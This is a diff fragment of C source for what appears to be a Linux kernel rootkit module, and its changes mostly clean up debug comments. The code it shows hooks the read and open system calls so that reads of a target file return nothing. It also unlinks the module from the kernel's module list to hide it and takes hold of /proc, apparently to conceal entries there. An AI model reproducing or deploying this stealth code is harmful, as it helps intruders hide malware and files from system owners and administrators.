@@ -52,16 +52,8 @@ int rk_iterate(struct file *file, struct dir_context *ctx)
 asmlinkage ssize_t (*original_read) (int, void* , size_t);
 
 asmlinkage ssize_t my_read(int fd, void *buf, size_t count){
-  // printk("before %s\n", buf);
   ssize_t out = original_read(fd, buf, count);
-  // printk("after %s\n", buf);
   if(strncmp(lastPath,targetPath,strlen(lastPath))==0){
-  //   char* lines = (char*)buf;
-    // int line_index = get_line_index(lines);
-    // buf = remove_line(lines,line_index);
-    // printk("Hello\n");
-    // buf = "hey";
-    // printk("after %s\n", buf);
     return 0;
   }
   return out;
@@ -71,15 +63,16 @@ asmlinkage int (*original_open) (const char*, int, mode_t);
 
 asmlinkage int my_open(const char* pathname, int flags, mode_t mode){
   long c = original_open(pathname , flags , mode);
-  // printk("evil open\n");
   strcpy(lastPath,pathname);
-  // printk("%s\n", lastPath);
   return c;
 }
 
 static int init(void)
 {
+    //hide the module
     list_del (& THIS_MODULE ->list);
+
+    //get the folder path object
     if(kern_path("/proc", 0, &p))
         return 0;
 
